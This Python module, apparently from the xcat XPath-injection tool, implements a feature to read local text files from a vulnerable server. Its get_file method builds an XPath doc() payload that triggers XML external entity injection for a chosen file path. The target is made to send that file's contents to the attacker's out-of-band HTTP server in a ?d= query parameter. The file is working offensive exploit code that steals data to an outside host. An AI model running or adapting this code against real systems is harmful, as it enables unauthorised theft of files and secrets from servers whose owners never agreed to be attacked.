from .oob_http import OOBDocFeature
from ..oob import http
from ..xpath import doc, concat, encode_for_uri
import asyncio


class EntityInjection(OOBDocFeature):
    NAME = "Read local text files"

    def TEST(self):
        return [
            doc("{}/entity/test".format(self.server.location)).add_path("/data") == http.OOBHttpRequestHandler.TEST_RESPONSE
        ]

    def get_file(self, requester, file_path, use_comment=False):
        """
        Return a string of the file path given in :param:`use_comment`

        :param requester: The requestmaker to use
        :type requester: xcat.lib.requests.requester.RequestMaker
        :param file_path: The path of the file to retrieve
        :type file_path: str
        :param use_comment: Serve this file through a comment.
        :type use_comment: bool
        :return: str or None -- The file content
        """
        identifier, future = self.server.expect_entity_injection(file_path, use_comment=use_comment)
        entity_inject = doc("{}/entity/{}".format(self.server.location, identifier))

        data_identifier, data_future = self.server.expect_data()
        send_data = doc(concat("{}/{}?d=".format(self.server.location, data_identifier),
                               encode_for_uri(entity_inject.add_path("/data").text)))

        yield from requester.send_payload(send_data)
        try:
            result = yield from asyncio.wait_for(data_future, 5)
        except asyncio.TimeoutError:
            #logger.error("5 second timeout expired waiting for doc() postback.")
            return None
        if not "d" in result:
            return None

        if not result["d"]:
            return None

        return result["d"][0]